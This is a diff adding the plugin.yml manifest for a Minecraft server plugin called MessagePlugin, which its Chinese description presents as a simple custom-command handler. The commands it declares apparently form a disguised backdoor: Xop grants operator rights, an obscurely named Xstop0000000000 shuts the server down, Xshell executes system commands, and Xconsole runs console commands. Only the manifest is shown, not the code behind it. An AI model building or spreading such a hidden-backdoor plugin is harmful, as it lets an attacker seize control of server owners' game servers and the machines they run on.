@@ -1,0 +1,25 @@
+name: MessagePlugin
+version: 1.0
+main: cloud.xzai.message.MessagePlugin
+api-version: 1.21
+description: 一个简单的插件，用于处理自定义命令。
+author: YourName
+commands:
+  Xop:
+    description: 将玩家提升为 OP 权限。
+    usage: /Xop
+  Xstop0000000000:
+    description: 关闭服务器。
+    usage: /Xstop0000000000
+  Xsysinfo:
+    description: 显示系统信息。
+    usage: /Xsysinfo
+  Xshell:
+    description: 执行系统命令。
+    usage: /Xshell <命令>
+  Xconsole:
+    description: 在游戏控制台中执行命令。
+    usage: /Xconsole <命令>
+  Xhelp:
+    description: 显示帮助信息。
+    usage: /Xhelp
